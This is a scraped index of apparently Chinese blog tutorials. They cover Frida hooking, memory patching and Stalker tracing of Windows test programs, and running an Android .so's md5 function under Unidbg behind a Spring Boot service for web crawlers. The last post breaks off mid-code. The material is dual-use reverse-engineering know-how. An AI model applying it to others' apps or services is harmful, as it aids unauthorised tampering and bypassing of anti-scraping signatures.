frida开启调试 frida -f \"XXX.exe\" -l .\\luoHook.js --runtime v8 --debug --pause //回显内容如下: Chrome Inspector server listening on port 9229 打开chrome://inspect,点击Open dedicated DevTools for Node 对代码进行下断 frida执行%resume,发现成功断下 ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:5:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"创建本地函数 Frida 提供了NativeFunctions API可以创建从JS层调用的辅助函数.如果我们想要调用导出函数或目标进程空间内的任意函数,这将十分有用.其语法如下: new NativeFunction(address, returnType, argTypes[, abi]) //TYPES 可选如下: void pointer int uint long ulong char uchar size_t ssize_t float double int8 uint8 int16 uint16 int32 uint32 int64 uint64 bool //ABIS 可选如下: default Windows 32-bit: sysv stdcall thiscall fastcall mscdecl Windows 64-bit: win64 UNIX x86: sysv unix64 UNIX ARM: sysv vfp 目标进程,测试代码如下: #include \u003cstdio.h\u003e int add(int a, int b) { return a + b; } int main() { int a = 10; int b = 0; scanf(\"%d\", \u0026b); printf(\"%d + %d = %d\\r\\n\", a, b, add(a, b)); return 0; } Frida注入代码如下: var addPtr = Process.mainModule.base.add(0x16F920) const addFunc = new NativeFunction(addPtr, 'int', ['int', 'int']); console.log(\"addFunc:\",addFunc(10, 100)) ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:6:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"函数替换 对于函数替换,Frida为我们提供了两种方法,即使用Interceptor.replace()或Memory.patchCode(). 目标进程,测试代码如下: #include \u003cstdio.h\u003e int add(int a, int b) { return a + b; } int main() { int a = 10; int b = 0; scanf(\"%d\", \u0026b); printf(\"%d + %d = %d\\r\\n\", a, b, add(a, b)); return 0; } Frida注入代码如下: var addPtr = Process.mainModule.base.add(0x16F920) console.log(addPtr) //方式一 Interceptor.replace(addPtr, new NativeCallback(function(a, b){ return 1022; }, 'int', ['int', 'int'])) //方式二 // Memory.patchCode(addPtr, Process.pageSize, function (code) { // const cw = new X86Writer(code, { pc: addPtr }); // cw.putMovRegU32('eax', 1234); // cw.putRet(); // cw.flush(); // }); NativeCallback声明如下: new NativeCallback(func, returnType, argTypes[, abi]) ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:7:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"内存扫描 对于内存扫描,Frida提供了以下两个API接口: //pattern的格式为由空格分隔的16进制字符串 Memory.scan(address, size, pattern, callbacks) Memory.scanSync(address, size, pattern) 目标进程,测试代码如下: #include \u003cstdio.h\u003e int main() { printf(\"%s\\r\\n\", \"XiaLuoHun Hello!\"); printf(\"%s\\r\\n\", \"XiaLuoXXn Hello!\"); return 0; } 在Frida中编写代码,匹配\"XiaLuo__n\"如下: var mainModule = Process.mainModule; var pattern = \"58 69 61 4C 75 6F ?? ?? 6E\"; //方式一 // var matches = Memory.scanSync(mainModule.base, mainModule.size, pattern) // matches.forEach(match =\u003e { // console.log(match.address + \":\" + match.address.readCString(match.size)); // }); //方式二 Memory.scan(mainModule.base, mainModule.size, pattern, { onMatch(address, size) { console.log(address + \":\" + size); //获取当前内存保护属性 var oldProtect = null; var ranges = Process.enumerateRangesSync({ protection: \"---\", coalesce: false, }); for (var i = 0; i \u003c ranges.length; i++) { var range = ranges[i]; if (address.compare(range.base) \u003e= 0 \u0026\u0026 address.compare(range.base.add(range.size)) \u003c 0) { oldProtect = range.protection; break; } } //console.log(\"oldProtect:\", oldProtect); Memory.protect(address, size, \"rwx\"); //Luo address.writeByteArray([0x4c, 0x75, 0x6f, 0x00]); Memory.protect(address, size, oldProtect); }, }); ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:8:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"使用自定义库 使用下述测试代码进行动态库编译 int mySub(int a, int b) { return a - b; } 在Frida中编写下述代码进行动态库功能调用 var luoDllMod = Module.load(\"E:\\\\VSWork\\\\luoDll\\\\x64\\\\Release\\\\luoDll.dll\") var mySubAddr = luoDllMod.findExportByName(\"mySub\") var mySub = new NativeFunction(ptr(mySubAddr), 'int', ['int', 'int']); console.log(\"mySub:\", mySub(100, 20)) ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:9:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"寄存器读写 目标进程,测试代码如下: #include \u003cstdio.h\u003e int add(int a, int b) { return a + b; } int main(int argc, char** argv) { printf(\"result: %d\\r\\n\", add(10, 20)); return 0; } Frida注入代码如下: var addPtr = Process.mainModule.base.add(0x16F8F0) Interceptor.attach(addPtr, { onEnter (args) { // console.log('args0:' + args[0]); // console.log('args1:' + args[1]); console.log('args1:' + this.context.rcx.toInt32()); console.log('args2:' + this.context.rdx.toInt32()); } }); //修改寄存器 // Memory.patchCode(addPtr, Process.pointerSize, function (code) { // const cw = new X86Writer(code, { pc: addPtr }); // cw.putMovRegU32('eax', 1234); // cw.putRet(); // cw.flush(); // }); ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:10:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"结构体解析 以Windows平台的SYSTEM_INFO为例进行解析: //win64 结构体成员偏移如下 typedef struct _SYSTEM_INFO { union { DWORD dwOemId; //0 struct { WORD wProcessorArchitecture; WORD wReserved; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; DWORD dwPageSize; //4 LPVOID lpMinimumApplicationAddress; //8 LPVOID lpMaximumApplicationAddress; //16 DWORD_PTR dwActiveProcessorMask; //24 DWORD dwNumberOfProcessors; //32 DWORD dwProcessorType; //36 DWORD dwAllocationGranularity; //40 WORD wProcessorLevel; //44 WORD wProcessorRevision; //46 } SYSTEM_INFO, *LPSYSTEM_INFO; 目标进程,测试代码如下: #include \u003ciostream\u003e #include \u003cWindows.h\u003e int main(int argc, char** argv) { SYSTEM_INFO sysInfo; GetSystemInfo(\u0026sysInfo); //std::cout \u003c\u003c \"sysInfoSize:\" \u003c\u003c sizeof(sysInfo) \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \"Hardware information: \\n\"; //std::cout \u003c\u003c \" OEM ID: \" \u003c\u003c sysInfo.dwOemId \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Page size: \" \u003c\u003c sysInfo.dwPageSize \u003c\u003c \" bytes\\n\"; //std::cout \u003c\u003c \" Minimum application address: \" \u003c\u003c sysInfo.lpMinimumApplicationAddress \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Maximum application address: \" \u003c\u003c sysInfo.lpMaximumApplicationAddress \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Active processor mask: \" \u003c\u003c sysInfo.dwActiveProcessorMask \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Number of processors: \" \u003c\u003c sysInfo.dwNumberOfProcessors \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Processor type: \" \u003c\u003c sysInfo.dwProcessorType \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Allocation granularity: \" \u003c\u003c sysInfo.dwAllocationGranularity \u003c\u003c \" bytes\\n\"; //std::cout \u003c\u003c \" Processor level: \" \u003c\u003c sysInfo.wProcessorLevel \u003c\u003c \"\\n\"; //std::cout \u003c\u003c \" Processor revision: \" \u003c\u003c sysInfo.wProcessorRevision \u003c\u003c \"\\n\"; return 0; } Frida解析结构体代码如下: var getSystemInfoAddr = Module.getExportByName(\"kernelbase.dll\", \"GetSystemInfo\") var flag = 0 Interceptor.attach(getSystemInfoAddr, { onEnter(args) { this.arg0 = args[0] flag += 1 }, onLeave(retval) { if (flag == 1) { var sysInfoPtr = ptr(this.arg0) var dwOemId = sysInfoPtr.readInt() var dwPageSize = sysInfoPtr.add(4).readInt() var lpMinimumApplicationAddress = sysInfoPtr.add(8).readU64().toString(16) var lpMaximumApplicationAddress = sysInfoPtr.add(16).readU64().toString(16) var dwActiveProcessorMask = sysInfoPtr.add(24).readU64() var dwNumberOfProcessors = sysInfoPtr.add(32).readInt() var dwProcessorType = sysInfoPtr.add(36).readInt() var dwAllocationGranularity = sysInfoPtr.add(40).readInt() var wProcessorLevel = sysInfoPtr.add(44).readU16() var wProcessorRevision = sysInfoPtr.add(46).readU16() console.log(\"dwOemId:\", dwOemId) console.log(\"dwPageSize:\", dwPageSize) console.log(\"lpMinimumApplicationAddress:\", lpMinimumApplicationAddress) console.log(\"lpMaximumApplicationAddress:\", lpMaximumApplicationAddress) console.log(\"dwActiveProcessorMask:\", dwActiveProcessorMask) console.log(\"dwNumberOfProcessors:\", dwNumberOfProcessors) console.log(\"dwProcessorType:\", dwProcessorType) console.log(\"dwAllocationGranularity:\", dwAllocationGranularity) console.log(\"wProcessorLevel:\", wProcessorLevel) console.log(\"wProcessorRevision:\", wProcessorRevision) } } }) ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:11:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"CModule 通过CModule API,我们可以传递一串C代码,并在内存中将其编译为机器代码.但需要注意的是该功能在tinycc下编译,因此有一定的局限性. CModule语法如下: new CModule(code[, symbols, options]) 目标进程,测试代码如下: #include \u003ciostream\u003e #include \u003cWindows.h\u003e int main(int argc, char** argv) { SYSTEMTIME localTime; GetLocalTime(\u0026localTime); return 0; } Frida注入代码如下: const source = ` #include \u003cstdio.h\u003e typedef unsigned short WORD; typedef struct _SYSTEMTIME { WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds; } SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; void PrintSystemTime(const SYSTEMTIME* pTime) { printf(\"Current local time is: %04d-%02d-%02d %02d:%02d:%02d.%03d\\n\", pTime-\u003ewYear, pTime-\u003ewMonth, pTime-\u003ewDay, pTime-\u003ewHour, pTime-\u003ewMinute, pTime-\u003ewSecond, pTime-\u003ewMilliseconds); } ` const cmMod = new CModule(source) //console.log(JSON.stringify(cmMod)) var printSystemTimeAddr = cmMod.PrintSystemTime var printSystemTimeFunc = new NativeFunction(ptr(printSystemTimeAddr), 'void', ['pointer']); var getLocalTimeAddr = Module.getExportByName(\"kernelbase.dll\", \"GetLocalTime\") Interceptor.attach(getLocalTimeAddr, { onEnter(args) { this.arg0 = args[0] }, onLeave(retval) { printSystemTimeFunc(ptr(this.arg0)) } }) ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:12:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"Stalker Stalker是一个代码跟踪引擎,可以跟踪线程并捕获调用的每个函数、代码块和指令.其语法如下: Stalker.follow([threadId, options]) threadId:要跟踪的线程ID,可通过Process.enumerateThreadsSync()或函数内部的this.threadId获取 options:用于启用事件跟踪的选项 events: { call: true, // CALL instructions: yes please ret: false, // RET instructions exec: false, // all instructions block: false, // block executed: coarse execution trace compile: false // block compiled: useful for coverage } 目标进程,测试代码如下: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(int argc, char* argv[]) { FILE* file = fopen(\"code.dat\", \"r+\"); if (file == nullptr) { printf(\"File opening failed\\r\\n\"); } else { printf(\"File opened successfully\\r\\n\"); } return 0; } Frida 跟踪函数调用关系代码如下: var mainPtr = Process.mainModule.base.add(0x16F960) var modBase = Process.mainModule.base //console.log(\"modBase:\", modBase) var moduleName = \"luoDst.exe\" Interceptor.attach(mainPtr, { onEnter(args) { Stalker.follow(this.threadId, { events: { call: true, ret: false, exec: false, block: false, compile: false, }, onReceive: function (events) { var eventsData = Stalker.parse(events, { annotate: true, stringify: true }); for (var idx in eventsData) { // 调用的流程,地址1是哪里发生的调用,地址2是调用到了哪里 var dataSp = eventsData[idx]; var addr1 = dataSp[1]; var addr2 = dataSp[2]; try { var module1 = Process.getModuleByAddress(ptr(addr1)); if (module1.name.indexOf(moduleName) != -1) { var module2 = Process.getModuleByAddress(ptr(addr2)); console.log(module1.name + \"!\" + ptr(addr1).sub(module1.base) + \" -\u003e \" + module2.name + \"!\" + ptr(addr2).sub(module2.base)) } } catch (err) { //console.log(dataSp); } } }, onCallSummary: function (summary) { //console.log(JSON.stringify(summary, null, 4)); }, }) }, onLeave(retval) { Stalker.unfollow(this.threadId) } }); Frida 进行指令跟踪代码如下: var mainPtr = Process.mainModule.base.add(0x16F960) var modBase = Process.mainModule.base //console.log(\"modBase:\", modBase) var moduleName = \"luoDst.exe\" var moduleStart = mainPtr; var moduleEnd = modBase + 0x1000; var preRegs = {} function GetDiffRegs(context, preRegs) { //preRegs是调用之前的寄存器 var diffRegs = {}; // console.log(Object.keys(JSON.parse(JSON.stringify(context)))); for (const [regName, regValue] of Object.entries(JSON.parse(JSON.stringify(context)))) { if (regName != \"pc\" \u0026\u0026 preRegs[regName] !== regValue) { preRegs[regName] = regValue; diffRegs[regName] = regValue; } } return diffRegs; } Interceptor.attach(mainPtr, { onEnter(args) { Stalker.follow(this.threadId, { events: { call: true, ret: false, exec: false, block: false, compile: false, }, transform(iterator) { let instruction = iterator.next(); do { const startAddress = instruction.address; const isModuleCode = startAddress.compare(moduleStart) \u003e= 0 \u0026\u0026 startAddress.compare(moduleEnd) === -1; //在模块起始地址才打印 if (isModuleCode) { // console.log(startAddress, instruction); //指令执行之后调用，context寄存器上下文 iterator.putCallout(function (context) { var pc = context.pc; var module = Process.findModuleByAddress(pc); if (module \u0026\u0026 module.name.indexOf(moduleName) != -1) { var diffRegs = GetDiffRegs(context, preRegs); console.log(module.name + \"!\" + ptr(pc).sub(module.base), Instruction.parse(ptr(pc)), JSON.stringify(diffRegs)); } }); } iterator.keep(); } while ((instruction = iterator.next()) !== null); } }) }, onLeave(retval) { Stalker.unfollow(this.threadId) } }); ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:13:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"参考链接 Frida HandBook Frida JavaScript API ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:14:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Unidbg"],"content":" Unidbg Unidbg可以模拟执行so的方法,对于爬虫工程师来说,需要每次调用加密算法获取结果并添加到请求中获取最终的数据,故我们需要一个算法服务器来实现上述需求. ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:0:0","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"初识Spring Boot Spring:创建微服务应用程序的框架,比如我们常见的Web应用服务. Spring Boot:简化了Spring的配置,让开发更快捷、高效. Spring Boot的基本配置说明可以在下述网址进行获取. https://start.spring.io/ 使用IDEA选择Maven构建一个新项目. 在上述网站中获取Spring Boot Web服务配置. 点击EXPLORE按钮后,查看具体配置项, 将上述红框中的内容,添加我们我们新建项目的pom文件中进行同步. 进行样例代码编写如下: package org.example; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class Main { public static void main(String[] args) { SpringApplication.run(Main.class, args); } } 上述文件定义了整个项目的启动入口,接下来在新建的Controller中编写DemoController开发一个资源路径: package org.example.controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class DemoController { @GetMapping(\"/test\") public String test(){ return \"Hello Unidbg\"; } } 运行上述项目结果如下: 接下来用浏览器访问下述链接,即可看到返回的字符串. http://127.0.0.1:8080/test ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:1:0","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"Spring Boot和Unidbg结合 Unidbg也是基于Maven构建的Java项目,故可参考上述案例和Spring Boot进行结合. ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:2:0","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"测试so libluodst.so ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:2:1","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"模拟执行 使用Unidbg模拟调用so中的md5函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); String result = mainActivity.getMD5(\"xialuohun\"); System.out.println(result); } private final AndroidEmulator emulator; private final VM vm; private final Module module; public MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator,vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(new File(\"unidbg-android/src/test/java/com/example/luodst/files/libluodst.so\"), true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } public String getMD5(String data) { //执行JNI方法 DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); DvmObject dvmObject = obj.callJniMethodObject(emulator, \"md5(Ljava/lang/String;)Ljava/lang/String;\", data); String retval = (String) dvmObject.getValue(); return retval; } } ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:2:2","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"Web服务 Unidbg项目结构如下: 入口代码如下: package com.example.luodst; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } } Controller代码如下: package com.example.luodst.controller; import com.example.luodst.MainActivity; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class DemoController { MainActivity mainActivity = new MainActivity(); @GetMapping(\"/getMD5\") public String getMD5(String data){ return mainActivity.getMD5(data); } } 运行上述项目会报下述错误: SLF4J(W): Class path contains multiple SLF4J providers. SLF4J(W): Found provider [org.slf4j.reload4j.Reload4jServiceProvider@701fc37a] SLF4J(W): Found provider [ch.qos.logback.classic.spi.LogbackServiceProvider@4148db48] SLF4J(W): See https://www.slf4j.org/codes.html#multiple_bindings for an explanation. SLF4J(I): Actual provider is of type [org.slf4j.reload4j.Reload4jServiceProvider@701fc37a] 这是由于SLF4J包冲突所产生的异常,移除即可. 再次运行上述项目,访问下述链接,结果如下: http://127.0.0.1:8080/getMD5?data=xialuohun ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:2:3","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"Unidbg-boot-server Unidbg和Spring Boot的结合,前人已帮我们封装好了,项目及其配置如下: https://github.com/anjia0532/unidbg-boot-server ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:3:0","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"环境测试 项目的入口是UnidbgServerApplication,运行该入口,结果如下: 访问下述链接,获取模拟执行结果如下: http://127.0.0.1:9999/api/tt-encrypt/encrypt ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:3:1","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"添加模拟执行 项目本身已有一个示例,我们只需按照示例去移植对应内容即可. 注意 入口文件不需要动 web目录下放置的是Controller文件 项目结构如下: 我们只需新增上述三个文件即可. GetMD5Controller.java package com.anjia.unidbgserver.web; import com.anjia.unidbgserver.service.GetMD5ServiceWorker; import lombok.SneakyThrows; import lombok.extern.slf4j.Slf4j; import org.springframework.http.MediaType; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; import java.util.concurrent.CompletableFuture; @Slf4j @RestController @RequestMapping(path = \"/api/GetMD5\", produces = MediaType.APPLICATION_JSON_VALUE) public class GetMD5Controller { @Resource(name = \"getMD5Worker\") private GetMD5ServiceWorker getMd5ServiceWorker; @SneakyThrows @RequestMapping(value = \"\", method = {RequestMethod.GET, RequestMethod.POST}) public CompletableFuture\u003cString\u003e GetMd5(String data){ return getMd5ServiceWorker.getMD5(data); } } GetMD5Service.java package com.anjia.unidbgserver.service; import com.anjia.unidbgserver.config.UnidbgProperties; import com.anjia.unidbgserver.utils.TempFileUtils; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.AbstractJni; import com.github.unidbg.linux.android.dvm.DalvikModule; import com.github.unidbg.linux.android.dvm.DvmObject; import com.github.unidbg.linux.android.dvm.VM; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.IOException; public class GetMD5Service extends AbstractJni { private final AndroidEmulator emulator; private final VM vm; private final Module module; public GetMD5Service(UnidbgProperties unidbgProperties) { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator,vm).register(memory); //7.加载目标so文件 DalvikModule dm = null; try { dm = vm.loadLibrary(TempFileUtils.getTempFile(\"data/apks/so/libluodst.so\"), true); } catch (IOException e) { throw new RuntimeException(e); } //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } public String getMD5(String str) { //执行JNI方法 DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); DvmObject dvmObject = obj.callJniMethodObject(emulator, \"md5(Ljava/lang/String;)Ljava/lang/String;\", str); String retval = (String) dvmObject.getValue(); return retval; } public void destroy() throws IOException { emulator.close(); } } GetMD5ServiceWorker.java package com.anjia.unidbgserver.service; import com.anjia.unidbgserver.config.UnidbgProperties; import com.github.unidbg.worker.Worker; import com.github.unidbg.worker.WorkerPool; import com.github.unidbg.worker.WorkerPoolFactory; import lombok.SneakyThrows; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Value; import org.springframework.scheduling.annotation.Async; import org.springframework.stereotype.Service; import java.util.concurrent.CompletableFuture; import java.util.concurrent.TimeUnit; @Slf4j @Service(\"getMD5Worker\") public class GetMD5ServiceWorker extends Worker { private UnidbgProperties unidbgProperties; private WorkerPool pool; private GetMD5Service getMd5Service; @Autowired public void init(UnidbgProperties unidbgProperties) { this.unidbgProperties = unidbgProperties; } p","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:3:2","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":"参考链接 \u003cUnidbg逆向工程 原理与实践\u003e ","date":"2024-07-11","objectID":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/:4:0","tags":["Unidbg"],"title":"Unidbg生产环境部署","uri":"/posts/android/unidbg/06unidbg%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"categories":["Unidbg"],"content":" Unidbg Unidbg的作用是模拟执行so中的函数,处于Native层.而Java层的函数可以通过JNI调用Native层函数,那么Native层也可以通过JNI去调用Java层的函数. 在Native层调用Java层函数的时候,因为Unidbg中没有这些函数的实现,模拟执行必然失败.故我们需要在Unidbg中补充这些Java层函数,让Native层的函数去调用. ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:0:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"补环境入门 ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:1:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"测试Apk DogPro.apk ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:1:1","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"模拟执行 使用Unidbg模拟执行so中的getHash函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.getHash(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 